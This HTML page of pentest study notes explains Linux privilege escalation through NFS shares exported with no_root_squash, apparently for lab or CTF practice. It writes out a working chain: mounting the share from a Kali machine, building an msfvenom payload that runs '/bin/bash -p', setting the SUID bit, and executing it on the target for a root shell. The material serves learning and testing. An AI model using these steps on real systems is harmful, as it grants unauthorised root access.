<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>NFS Shared folders</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>NFS Shared folders</h1><br/>Privilege escalation vectors are not confined to internal access.  Shared folders and remote management interfaces such as SSH and Telnet  can also help you gain root access on the target system. Some cases will  also require using both vectors, e.g. finding a root SSH private key on  the target system and connecting via SSH with root privileges instead  of trying to increase your current user’s privilege level.<br /><br />Another  vector that is more relevant to CTFs and exams is a misconfigured  network shell. This vector can sometimes be seen during penetration  testing engagements when a network backup system is present.<br /><br />NFS  (Network File Sharing) configuration is kept in the /etc/exports file.  This file is created during the NFS server installation and can usually  be read by users.<br /><a href="https://i.imgur.com/irDQTze.png"><img src="images/43-1.png" alt="images/43-1.png" /></a><br /><br />The  critical element for this privilege escalation vector is the  “no_root_squash” option you can see above. By default, NFS will change  the root user to nfsnobody and strip any file from operating with root  privileges. If the “no_root_squash” option is present on a writable  share, we can create an executable with SUID bit set and run it on the  target system.<br /><br />We will start by enumerating mountable shares from our attacking machine.<br /><a href="https://i.imgur.com/CmXPDcv.png"><img src="images/43-2.png" alt="images/43-2.png" /></a><br /><br /> We will mount one of the “no_root_squash” shares to our attacking machine and start building our executable.  <br /><br /><br /><a href="https://i.imgur.com/DwAB1qs.png"><img src="images/43-3.png" alt="images/43-3.png" /></a><br /><br /><br /><br /> As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job.  <br /><br /><br /><a href="https://i.imgur.com/nWKpFkK.png"><img src="images/43-4.png" alt="images/43-4.png" /></a><br /><br /><br /><br /> Once we compile the code we will set the SUID bit.<br /><br /><br /><a href="https://i.imgur.com/rkZOOjZ.png"><img src="images/43-5.png" alt="images/43-5.png" /></a><br /><br /><br /><br /> You will see below that both files (nfs.c and nfs are present on the target system. We have worked on the mounted share so there was no need to transfer them).  <br /><br /><br /><a href="https://i.imgur.com/U7IjT38.png"><img src="images/43-6.png" alt="images/43-6.png" /></a><br /><br /><br /><br /> Notice the nfs executable has the SUID bit set on the target system and runs with root privileges<br /><br /><br /><br /><br /><br /><br /><br />-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br /><br /><br /><br /><br /><br /><br />Files created via NFS inherit the <strong>remote</strong>¬†user&#39;s ID. If the user is root, and root squashing is enabled, the ID will instead be set to the &quot;nobody&quot; user.<br />Check the NFS share configuration on the Debian VM:<br /><code>cat /etc/exports</code><br />Note that the <strong>/tmp</strong> share has root squashing disabled.<br />On your Kali box, switch to your root user if you are not already running as root:<br /><code>sudo su</code><br />Using Kali&#39;s root user, create a mount point on your Kali box and mount the <strong>/tmp</strong> share (update the IP accordingly)<small>:</small><br /><code>mkdir /tmp/nfs<br />mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs</code><br /><small>Still using Kali&#39;s root user, generate a payload using </small><strong><small>msfvenom</small></strong><small> and save it to the mounted share (this payload simply calls /bin/bash):</small><br /><code>msfvenom -p linux/x86/exec CMD=&quot;/bin/bash -p&quot; -f elf -o /tmp/nfs/shell.elf</code><br />Still using Kali&#39;s root user, make the file executable and set the SUID permission:<br /><code>chmod +xs /tmp/nfs/shell.elf</code><br />Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:<br /><code>/tmp/shell.elf</code><br /></div></body></html>